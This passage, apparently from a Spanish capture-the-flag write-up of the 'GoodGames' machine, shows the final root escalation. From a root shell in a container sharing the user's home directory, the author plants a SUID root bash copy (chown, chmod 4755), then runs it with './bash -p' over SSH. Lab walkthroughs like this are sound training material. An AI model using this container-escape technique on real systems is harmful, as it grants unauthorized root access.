-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r--r-- 1 augustus augustus      21 Oct 15 00:03 test.txt
-rw-r----- 1 root     augustus      33 Oct 14 19:38 user.txt
```

Salimos para estar dentro del contenedor y ahí está la **Bash**:
```bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1236
drwxr-xr-x 2 1000 1000    4096 Oct 14 23:09 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwxr-xr-x 1 1000 1000 1234376 Oct 14 23:09 bash
-rw-r--r-- 1 1000 1000      21 Oct 14 23:03 test.txt
-rw-r----- 1 root 1000      33 Oct 14 18:38 user.txt
```

Vamos a usar **chown** para poner como propietario de la **Bash** al **usuario Root** del contenedor:
```bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1236
drwxr-xr-x 2 1000 1000    4096 Oct 14 23:09 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwxr-xr-x 1 root root 1234376 Oct 14 23:09 bash
-rw-r--r-- 1 1000 1000      21 Oct 14 23:03 test.txt
-rw-r----- 1 root 1000      33 Oct 14 18:38 user.txt
```

Por último, vamos a modificar la **Bash** para que tenga **permisos SUID** y cualquier usuario pueda usarlo:
```bash
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1236
drwxr-xr-x 2 1000 1000    4096 Oct 14 23:09 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwsr-xr-x 1 root root 1234376 Oct 14 23:09 bash
-rw-r--r-- 1 1000 1000      21 Oct 14 23:03 test.txt
-rw-r----- 1 root 1000      33 Oct 14 18:38 user.txt
```
Listo.

Lo comprobamos en el **servicio SSH**:
```bash
augustus@GoodGames:~$ ls -la
total 1236
drwxr-xr-x 2 augustus augustus    4096 Oct 15 00:09 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1234376 Oct 15 00:09 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r--r-- 1 augustus augustus      21 Oct 15 00:03 test.txt
-rw-r----- 1 root     augustus      33 Oct 14 19:38 user.txt
```
Aparece el cambio.

Ya solo entramos a la **Bash** con privilegios y obtenemos la flag del **Root**:
```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
```
Hemos completado la máquina.
